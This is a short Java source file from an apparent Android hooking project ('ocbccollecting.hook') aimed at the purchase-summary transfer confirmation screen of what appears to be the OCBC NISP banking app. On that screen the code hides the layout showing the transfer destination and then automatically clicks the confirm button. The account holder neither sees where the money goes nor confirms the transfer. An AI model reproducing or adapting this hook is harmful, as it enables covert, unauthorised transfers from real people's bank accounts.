package com.example.ocbccollecting.hook.activity;

import android.app.Activity;
import android.view.View;

import com.example.ocbccollecting.utils.ViewUtil;

//钱包确认转账信息
public class PurchaseSummaryActivity extends BaseActivity {
    @Override
    public String getActivityName() {
        return "com.ocbcnisp.byon.ui.transaction.transactionsummary.PurchaseSummaryActivity";
    }

    @Override
    public void onCreated(Activity activity) {
        super.onCreated(activity);
        positioningView("destination_info_layout");
    }

    @Override
    public void positioningView(View view) {
        switch (ViewUtil.getResourceEntryName(view)) {
            case "confirm_btn":
                ViewUtil.performClick(view);
                break;
            case "destination_info_layout":
                view.setVisibility(View.GONE);
                positioningView("confirm_btn");
                break;
        }
    }
}
